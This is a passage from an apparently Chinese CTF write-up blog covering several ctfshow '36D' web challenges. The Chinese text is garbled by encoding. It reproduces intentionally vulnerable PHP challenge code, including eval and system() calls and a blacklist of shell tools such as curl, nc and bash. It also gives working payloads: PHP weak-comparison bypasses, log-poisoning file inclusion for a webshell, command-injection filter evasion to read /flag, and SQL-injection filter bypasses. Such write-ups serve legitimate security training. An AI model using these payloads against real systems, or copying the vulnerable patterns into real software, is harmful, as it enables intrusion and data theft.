id="WEB-ç»™ä½ shell-36Dæ¯"><a href="#WEB-ç»™ä½ shell-36Dæ¯" class="headerlink" title="WEB_ç»™ä½ shell_36Dæ¯"></a>WEB_ç»™ä½ shell_36Dæ¯</h3><p>æŸ¥çœ‹æºç å‘ç°<code>?view_source</code>ï¼Œå¾—åˆ°æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//It&#x27;s no need to use scanner. Of course if you want, but u will find nothing.</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;view_source&#x27;</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCookie</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    $arr = explode(<span class="string">&#x27;:&#x27;</span>, $s);</span><br><span class="line">    <span class="keyword">if</span> ($arr[<span class="number">0</span>] === <span class="string">&#x27;&#123;&quot;secret&quot;&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^[\&quot;0-9A-Z]*&#125;$/&#x27;</span>, $arr[<span class="number">1</span>]) &amp;&amp; count($arr) === <span class="number">2</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !theFirstTimeSetCookie() ) setcookie(<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;&#x27;</span>, time()<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">haveFun</span>(<span class="params">$_f_g</span>) </span>&#123;</span><br><span class="line">    $_g_r = <span class="number">32</span>;</span><br><span class="line">    $_m_u = md5($_f_g);</span><br><span class="line">    $_h_p = strtoupper($_m_u);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $_g_r; $i++) &#123;</span><br><span class="line">        $_i = substr($_h_p, $i, <span class="number">1</span>);</span><br><span class="line">        $_i = ord($_i);</span><br><span class="line">        print_r($_i &amp; <span class="number">0xC0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;secret&#x27;</span>]) ? $json = $_COOKIE[<span class="string">&#x27;secret&#x27;</span>] : setcookie(<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;&#123;&quot;secret&quot;:&quot;&#x27;</span> . strtoupper(md5(<span class="string">&#x27;y1ng&#x27;</span>)) . <span class="string">&#x27;&quot;&#125;&#x27;</span>, time()+<span class="number">7200</span> );</span><br><span class="line">checkCookie($json) ? $obj = @json_decode($json, <span class="literal">true</span>) : <span class="keyword">die</span>(<span class="string">&#x27;no&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($obj &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;give_me_shell&#x27;</span>])) &#123;</span><br><span class="line">    ($obj[<span class="string">&#x27;secret&#x27;</span>] != $flag_md5 ) ? haveFun($flag) : <span class="keyword">echo</span> <span class="string">&quot;here is your webshell: <span class="subst">$shell_path</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>; </span><br></pre></td></tr></table></figure><p>å…ˆçœ‹ä¸‹haveFunå‡½æ•°ï¼Œè¾“å‡º<code>$_i &amp; 0xC0</code>ï¼Œ<code>0xC0</code>äºŒè¿›åˆ¶å½¢å¼<code>11000000</code>ï¼Œç”±äºæ•°å­—çš„asciiç èŒƒå›´ä¸º48-57ï¼Œå¤§å†™å­—æ¯çš„asciiç èŒƒå›´65-90ï¼Œå°å†™å­—æ¯çš„èŒƒå›´97-122</p><p>å› æ­¤ä¸è¿ç®—çš„ç»“æœåªæœ‰ä¸¤ç§:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000000&#x3D;&#x3D;&gt;0</span><br><span class="line">01000000&#x3D;&#x3D;&gt; 64</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”ä¸ºæ•°å­—çš„æ—¶å€™ç”±äºasciiå°äº64ï¼Œå› æ­¤è®¡ç®—ç»“æœä¸º0ï¼ŒåŒç†ï¼Œä¸ºå¤§å°å†™å­—æ¯æ—¶è®¡ç®—ç»“æœä¸º64</p><p>ç”±è¿”å›ç»“æœï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0006464640064064646464006406464064640064006400000000000</span><br></pre></td></tr></table></figure><p>md5å‰ä¸‰ä¸ªå­—ç¬¦å‡ä¸ºæ•°å­—ï¼Œåˆï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$obj[<span class="string">&#x27;secret&#x27;</span>] != $flag_md5</span><br><span class="line"><span class="comment">// 123==&#x27;123a&#x27;</span></span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒæ˜¯å¼±æ¯”è¾ƒï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨å¼±ç±»å‹ç»•è¿‡ï¼Œå°è¯•çˆ†ç ´ï¼š</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200912152527.png"></p><p>æ³¨æ„ä¸èƒ½æ˜¯ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;secret&quot;</span>:<span class="string">&quot;115&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>è®¿é—®å¾—åˆ°æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">//there are some secret waf that you will never know, fuzz me if you can</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;hidden_filter.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$_SESSION[<span class="string">&#x27;login&#x27;</span>])</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;location.href=\&#x27;./index.php\&#x27;&lt;/script&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match($secret_waf, $code)) &#123;</span><br><span class="line">        <span class="comment">//æ¸…ç©ºsession ä»å¤´å†æ¥</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;\$_SESSION[&quot;</span> . $code . <span class="string">&quot;]=false;&quot;</span>); <span class="comment">//you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When you feel that you are lost, do not give up, fight and move on.</span></span><br><span class="line"><span class="comment"> * Being a hacker is not easy, it requires effort and sacrifice.</span></span><br><span class="line"><span class="comment"> * But remember â€¦ we are legion!</span></span><br><span class="line"><span class="comment"> *  â€”â€”â€”â€”Deep CTF 2020</span></span><br><span class="line"><span class="comment">*/</span> </span><br></pre></td></tr></table></figure><p>fuzzä¸€ä¸‹ï¼Œå‘ç°ä¸‹é¢çš„éƒ½ä¸èƒ½ç”¨äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96; ; include &#39; &quot;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç”¨çŸ­æ ‡ç­¾ï¼Œä»¥ä¸‹å‡å¯ä»¥æ­£å¸¸å…è®¸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span>`ls`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;1]&#x3D;1?&gt;&lt;?&#x3D;require~%D0%99%93%9E%98?&gt;</span><br></pre></td></tr></table></figure><h3 id="WEB-RemoteImageDownloader-36D"><a href="#WEB-RemoteImageDownloader-36D" class="headerlink" title="WEB_RemoteImageDownloader_36D"></a>WEB_RemoteImageDownloader_36D</h3><h3 id="WEB-ALL-INFO-U-WANT-36D"><a href="#WEB-ALL-INFO-U-WANT-36D" class="headerlink" title="WEB_ALL_INFO_U_WANT_36D"></a>WEB_ALL_INFO_U_WANT_36D</h3><p>æ‰«ç›®å½•å‘ç°<code>index.php.bak</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">phpvisit all_info_u_want.php <span class="keyword">and</span> you will get all information you want</span><br><span class="line"></span><br><span class="line">= =Thinking that it may be difficult, i decided to show you the source code:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//give you all information you want</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;all_info_i_want&#x27;</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    $file = <span class="string">&quot;/var/www/html/&quot;</span> . $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="comment">//really baby include</span></span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">really really really baby challenge right? </span><br></pre></td></tr></table></figure><p>è®¿é—®åŒ…å«flagæç¤ºæ˜¯å‡çš„ï¼Œå°è¯•getshellï¼Œé¢„æœŸè§£æ˜¯åŒ…å«<code>/var/log/nginx/access.log</code>ï¼ŒæŠŠä¸€å¥è¯æ”¾åœ¨è¯·æ±‚å¤´é‡ŒåŒ…å«èšå‰‘è¿</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -r -l <span class="string">&quot;flag&quot;</span>  /etc</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°<code>/etc/opt/secret/what_you_want</code></p><p>å¦å¤–ä¸€ç§åŠæ³•æ˜¯åŒ…å«è‡ªèº«ï¼Œæ„é€ ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://591caabf-a243-4850-8254-3c4f913b12e2.chall.ctf.show/all_info_u_want.php?file=all_info_u_want.php&amp;all_info_i_want&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200912204747.png"></p><h3 id="WEB-WUSTCTFæœ´å®æ— åRevenge-36Dæ¯"><a href="#WEB-WUSTCTFæœ´å®æ— åRevenge-36Dæ¯" class="headerlink" title="WEB_WUSTCTFæœ´å®æ— åRevenge_36Dæ¯"></a>WEB_WUSTCTFæœ´å®æ— åRevenge_36Dæ¯</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    $len=strlen($str);</span><br><span class="line">    $l=<span class="number">1</span>;</span><br><span class="line">    $k=intval($len/<span class="number">2</span>)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$k;$j++)</span><br><span class="line">        <span class="keyword">if</span> (substr($str,$j,<span class="number">1</span>)!=substr($str,$len-$j<span class="number">-1</span>,<span class="number">1</span>)) &#123;</span><br><span class="line">            $l=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> ($l==<span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line">    $numReverse = intval(strrev($num));</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[^0-9.-]/&#x27;</span>, $num)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;éæ´²æ¬¢è¿ä½ 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($numPositve &lt;= <span class="number">-999999999999999999</span> || $numPositve &gt;= <span class="number">999999999999999999</span>) &#123; <span class="comment">//åœ¨64ä½ç³»ç»Ÿä¸­ intval()çš„ä¸Šé™ä¸æ˜¯2147483647 çœçœå§</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;éæ´²æ¬¢è¿ä½ 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">    $md5=$_GET[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($md5==md5(md5($md5)))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;more&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;tail&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;less&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;head&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;tac&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;$&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;sort&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;curl&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;nc&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¿«åˆ°éæ´²äº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">å»éæ´²å§</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹ç¬¬ä¸€å…³ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯ä¸¤ä¸ªæ¡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">intval($num)&#x3D;&#x3D;&#x3D;intval(strrev($num))</span><br><span class="line">$num!&#x3D;strrev($num)å¹¶ä¸”$numåªåŒ…å«0-9.-</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¯ä»¥æ„é€ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;9.-9</span><br><span class="line">?num&#x3D;00.0</span><br><span class="line">?num&#x3D;10.010</span><br></pre></td></tr></table></figure><p>å†çœ‹ç¬¬äºŒå…³</p><p>åŒMD5ä¸æœ¬èº«å¼±ç›¸ç­‰</p><p>ç›´æ¥ç”¨<code>0e1138100474</code>ï¼Œæœ€åä¸€å…³å‘½ä»¤æ‰§è¡Œï¼Œå¯ä»¥ç”¨<code>\</code>å’Œ<code>%09</code>ç»•è¿‡ï¼Œpayload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;10.010&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\t%09&#x2F;flag</span><br><span class="line">?num&#x3D;10.010&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\t&lt;&#x2F;flag</span><br></pre></td></tr></table></figure><h3 id="WEB-Login-Only-For-36D-36D"><a href="#WEB-Login-Only-For-36D-36D" class="headerlink" title="WEB_Login_Only_For_36D_36D"></a>WEB_Login_Only_For_36D_36D</h3><p>æŸ¥çœ‹æºç ,å‘ç°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- if (!preg_match(&#39;&#x2F;admin&#x2F;&#39;, $uname)) die; --&gt;</span><br><span class="line">&lt;!-- select * from 36d_user where username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39;; --&gt;</span><br></pre></td></tr></table></figure><p>fuzzä¸€ä¸‹ï¼Œå‘ç°è¿‡æ»¤äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39; &quot; | ç©ºæ ¼ ascii substr &#x3D; and mid</span><br></pre></td></tr></table></figure><p>ç«‹é©¬æƒ³åˆ°<code>\</code>ï¼Œå‘ç°ä¸‹é¢å¯ä»¥å»¶æ—¶ï¼š</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200915205306.png"></p><p><code>ascii</code>å‡½æ•°å¯ä»¥ç”¨<code>ord</code>å‡½æ•°ä»£æ›¿ï¼Œç­‰å·ç”¨<code>like</code>ï¼Œ<code>substr</code>ç”¨<code>left</code>,payload:</p><figure class="highlight plain"><table><tr><td 